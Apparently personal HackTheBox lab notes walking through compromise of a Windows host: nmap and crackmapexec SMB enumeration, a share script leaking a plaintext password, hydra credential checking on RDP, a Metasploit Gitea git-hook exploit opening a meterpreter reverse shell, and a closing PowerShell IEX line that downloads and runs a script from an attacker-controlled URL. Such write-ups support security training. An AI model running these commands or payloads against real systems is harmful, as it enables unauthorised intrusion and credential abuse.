[[HackTheBox]]

## Network scanning

```
┌──(dd0x㉿kali)-[~/Desktop/HTB-Acad]
└─$ nmap -p 22,135,139,445,3000,3389 -sCV 10.129.230.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 09:57 EDT
Nmap scan report for 10.129.230.148
Host is up (0.25s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3000/tcp open  http          Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=e6ff64bbfbe2ff18; Path=/; HttpOnly
|     Set-Cookie: _csrf=kulTATYbYDHlPkBe3CrT10tn7Xo6MTc1MDY4NzA0NzE4MTIwMzYwMA; Path=/; Expires=Tue, 24 Jun 2025 13:57:27 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 23 Jun 2025 13:57:27 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Cube Case Gitea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=b3726dbc78b8414c; Path=/; HttpOnly
|     Set-Cookie: _csrf=FFbj4x1L2CmCZhY9Tg4MJIUbCzk6MTc1MDY4NzA0ODIwOTIxODAwMA; Path=/; Expires=Tue, 24 Jun 2025 13:57:28 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 23 Jun 2025 13:57:28 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Cube Case Gitea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a cup of tea) is
|_http-title:  Cube Case Gitea 
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN01
| Not valid before: 2025-02-22T20:56:06
|_Not valid after:  2025-08-24T20:56:06
|_ssl-date: 2025-06-23T13:58:08+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN01
|   NetBIOS_Domain_Name: WIN01
|   NetBIOS_Computer_Name: WIN01
|   DNS_Domain_Name: WIN01
|   DNS_Computer_Name: WIN01
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-23T13:57:54+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=6/23%Time=68595D46%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,29B9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=e6ff64bbfbe2ff18;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=kulTATYbYDHlPkBe3CrT10t
SF:n7Xo6MTc1MDY4NzA0NzE4MTIwMzYwMA;\x20Path=/;\x20Expires=Tue,\x2024\x20Ju
SF:n\x202025\x2013:57:27\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Mon,\x2023\x20Jun\x202025\x2013:57:27\x20GMT\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<head\x
SF:20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"v
SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>
SF:\x20Cube\x20Case\x20Gitea\x20</title>\n\t<link\x20rel=\"manifest\"\x20h
SF:ref=\"/manifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x2
SF:0name=\"theme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author
SF:\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x2
SF:0/>\n\t<meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20wit
SF:h\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20painless\x20self-hosted\x20"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(HTTPOptions,1000,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConte
SF:nt-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x
SF:20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=b3726dbc
SF:78b8414c;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=FFbj4x1L2CmCZh
SF:Y9Tg4MJIUbCzk6MTc1MDY4NzA0ODIwOTIxODAwMA;\x20Path=/;\x20Expires=Tue,\x2
SF:024\x20Jun\x202025\x2013:57:28\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\
SF:x20SAMEORIGIN\r\nDate:\x20Mon,\x2023\x20Jun\x202025\x2013:57:28\x20GMT\
SF:r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">
SF:\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x2
SF:0name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\
SF:">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n
SF:\t<title>Page\x20Not\x20Found\x20-\x20\x20Cube\x20Case\x20Gitea\x20</ti
SF:tle>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crosso
SF:rigin=\"use-credentials\">\n\t<meta\x20name=\"theme-color\"\x20content=
SF:\"#6cc644\">\n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git
SF:\x20with\x20a\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"descriptio
SF:n\"\x20content=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20i
SF:s");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: WIN01
|   NetBIOS computer name: WIN01\x00
|   Workgroup: HTBLAB\x00
|_  System time: 2025-06-23T08:57:59-05:00
|_clock-skew: mean: 1h00m00s, deviation: 2h14m12s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-23T13:57:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.02 seconds

```

#### Server Message Block
Server Message Block (SMB) is a network file sharing protocol, similar to FTP on Linux systems, that allows applications on a computer to read and write to files and request services from server programs. From a cybersecurity standpoint, SMB is critical because it is widely used in Windows networks for file and printer sharing, and it has frequently been targeted by attacks—such as those exploiting vulnerabilities like EternalBlue. 

#### Examine the SMB server using a tool called crackmapexec.
Crackmapexec provides a huge set of modules for both enumerating and attacking multiple services. 
```
┌──(dd0x㉿kali)-[~/Desktop/HTB-Acad]
└─$ crackmapexec smb 10.129.230.148
SMB         10.129.230.148  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
```

Check if a NULL session (anonymous login) is possible while enumerating existing users using the --users option. For this test, we will leave the options for user (-u) and password (-p) empty."
```
┌──(dd0x㉿kali)-[~/Desktop/HTB-Acad]
└─$ crackmapexec smb 10.129.230.148 -u '' -p '' --users
SMB         10.129.230.148  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.230.148  445    WIN01            [+] WIN01\: 
SMB         10.129.230.148  445    WIN01            [-] Error enumerating domain users using dc ip 10.129.230.148: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
SMB         10.129.230.148  445    WIN01            [*] Trying with SAMRPC protocol
```

we will specify the user as guest and instruct crackmapexec to enumerate shares using the --shares option

```
┌──(dd0x㉿kali)-[~/Desktop/HTB-Acad]
└─$ crackmapexec smb 10.129.230.148 -u guest -p '' --shares
SMB         10.129.230.148  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.230.148  445    WIN01            [+] WIN01\guest: 
SMB         10.129.230.148  445    WIN01            [+] Enumerated shares
SMB         10.129.230.148  445    WIN01            Share           Permissions     Remark
SMB         10.129.230.148  445    WIN01            -----           -----------     ------
SMB         10.129.230.148  445    WIN01            ADMIN$                          Remote Admin
SMB         10.129.230.148  445    WIN01            C$                              Default share
SMB         10.129.230.148  445    WIN01            Devs                            
SMB         10.129.230.148  445    WIN01            IPC$                            Remote IPC

```

### Windows Initial Access
SMB Exploitation
 spider (--spider) the custom share (Devs) that we have found. If the credentials are correct, it could reveal more information about the contents in the share.

```
┌──(dd0x㉿kali)-[~]
└─$ crackmapexec smb 10.129.230.148 -u "john" -p 'SuperSecurePass123' --spider Devs --pattern .
SMB         10.129.230.148  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.230.148  445    WIN01            [+] WIN01\john:SuperSecurePass123 
SMB         10.129.230.148  445    WIN01            [*] Started spidering
SMB         10.129.230.148  445    WIN01            [*] Spidering .
SMB         10.129.230.148  445    WIN01            //10.129.230.148/Devs/. [dir]
SMB         10.129.230.148  445    WIN01            //10.129.230.148/Devs/.. [dir]
SMB         10.129.230.148  445    WIN01            //10.129.230.148/Devs/tmp.ps1 [lastm:'2025-02-23 16:32' size:1145]
SMB         10.129.230.148  445    WIN01            [*] Done spidering (Completed in 0.9052197933197021)
```

```
┌──(dd0x㉿kali)-[~]
└─$ crackmapexec smb 10.129.230.148 -u "john" -p 'SuperSecurePass123' --share Devs --get-file tmp.ps1 tmp.ps1
SMB         10.129.230.148  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.230.148  445    WIN01            [+] WIN01\john:SuperSecurePass123 
SMB         10.129.230.148  445    WIN01            [*] Copy tmp.ps1 to tmp.ps1
SMB         10.129.230.148  445    WIN01            [+] File tmp.ps1 was transferred to tmp.ps1

```

```
┌──(dd0x㉿kali)-[~]
└─$ cat tmp.ps1                                                                                              
# Script: CopyFileFromRemoteShare.ps1
$username = "WIN01\john"
$password = "SuperSecurePass123"  
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

$remoteShare = "\\FileServer01\SharedFolder"
$sourceFileName = Read-Host -Prompt "File> "
$sourceFile = "$remoteShare\$sourceFileName"
$destinationFile = "C:\Temp\$sourceFileName"
$destinationDir = "C:\Temp"

if (-not (Test-Path $destinationDir)) {
    New-Item -Path $destinationDir -ItemType Directory -Force
}

try {
    New-PSDrive -Name "Z" -PSProvider FileSystem -Root $remoteShare -Credential $credential -ErrorAction Stop

    if (Test-Path "Z:\$sourceFileName") {
        Copy-Item -Path "Z:\$sourceFileName" -Destination $destinationFile -Force
        Write-Output "File copied successfully to $destinationFile"
    } else {
        Write-Output "Error: File '$sourceFileName' not found in $remoteShare"
    }
} catch {
    Write-Output "An error occurred: $_"
} finally {
    Remove-PSDrive -Name "Z" -Force -ErrorAction SilentlyContinue
}      
```

 We can try them against another service such as RDP. Also, we can check if they are valid by using a brute-force tool called hydra. Be aware that brute forcing in general is to be considered as a last resort, due to the "noise" of the attack and the large number of alerts that will be produced in a hardened environment (which could lead to being banned from the network). But since we have just a single set of credentials to verify, we can use it on RDP like so:
```
┌──(dd0x㉿kali)-[~]
└─$ hydra -l john -p "SuperSecurePass123" rdp://10.129.230.148
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-25 11:12:44
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking rdp://10.129.230.148:3389/
[3389][rdp] host: 10.129.230.148   login: john   password: SuperSecurePass123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-25 11:12:49
```
As you can see, hydra just confirmed that these credentials are valid and we can use an RDP session to work on our target.

### Gitea Exploitation
Now, let’s jump to Gitea. We will use msfconsole again and search through the database for any known exploits.

```
msf6 exploit(multi/http/gitea_git_hooks_rce) > show options

Module options (exploit/multi/http/gitea_git_hooks_rce):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   PASSWORD   SuperSecurePass123  yes       Password to use
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS     10.129.230.148      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      3000                yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                   yes       Base path
   URIPATH                        no        The URI to use for this exploit (default is random)
   USERNAME   john                yes       Username to authenticate with
   VHOST                          no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

```
msf6 exploit(multi/http/gitea_git_hooks_rce) > exploit
[*] Started reverse TCP handler on 10.10.15.104:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Gitea version is 1.12.4
[*] Executing Windows Dropper for windows/x64/meterpreter/reverse_tcp
[*] Authenticate with "john/SuperSecurePass123"
[+] Logged in
[*] Create repository "Opela_Job"
[+] Repository created
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created
[*] Command Stager progress -  20.14% done (2046/10161 bytes)
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created
[*] Command Stager progress -  40.27% done (4092/10161 bytes)
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created
[*] Command Stager progress -  60.41% done (6138/10161 bytes)
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created
[*] Command Stager progress -  80.54% done (8184/10161 bytes)
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created, shell incoming...
[*] Command Stager progress - 100.00% done (10161/10161 bytes)
[*] Sending stage (203846 bytes) to 10.129.230.148
[*] Meterpreter session 1 opened (10.10.15.104:4444 -> 10.129.230.148:49690) at 2025-06-27 09:45:48 -0400
[*] Cleaning up
[*] Repository Opela_Job deleted.
```

```
┌──(dd0x㉿kali)-[~]
└─$ xfreerdp3 /u:john /p:"SuperSecurePass123" /v:10.129.230.148 /w:1366 /h:768
```

![[Pasted image 20250627221048.png]]

## Windows System Enumeration
#### User Information
determine what the user has permissions
```
whoami /priv
```

![[Pasted image 20250628235652.png]]
On the image
- **SeChangeNotiftPrivilege** - lets the user bypass directory traversal checks to naviate folders without explicit permissions (though it;s not immediateuly useful for us)
- **SeImpersonatePrivilege** - allows user to impersonate others atfter authentiacation-- an important capabiliy for potential privilege escalation
- **SeIncreaseWorkingSetPrivilege** - permits the user to increase the memory available to a process, which is a relatively minor privilege

#### Check groups
![[Pasted image 20250629000011.png]]
john belongs to several standard Windows groups like **Users, Remote Desktop Users, and Event Log Readers.** These groups grant basic access permissions but also suggest that this user has remote desktop capabilities, which we used to obtain a RDP session. The group memberships indicate this might be a regular user account with limited privileges, but we can perform additional checks with the commands **systeminfo and wmic qfe.**

![[Pasted image 20250629000422.png]]
- systeminfo command shoes detauled info about the windows system including the OS version, hardware, installed updates, and network settings
- wmic qfe speicifically lists all installed Windows updates (qfe stands for Quick Fix Engineering). 

Both commands require administrative or specific privieges to run, which is why we received Access Denied errors. so john is a regular user.

When administrators configure servers, they often want to optimize the server to their own needs and comfort. One way to do so is by scheduling tasks and operations, and having them happen on regular basis. 
```
schtasks /query /fo LIST /v
```

![[Pasted image 20250629001836.png]]
![[Pasted image 20250629001846.png]]

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://<attacking-machine-IP>:8080/winpeas.ps1')" > winpeas.txt
```

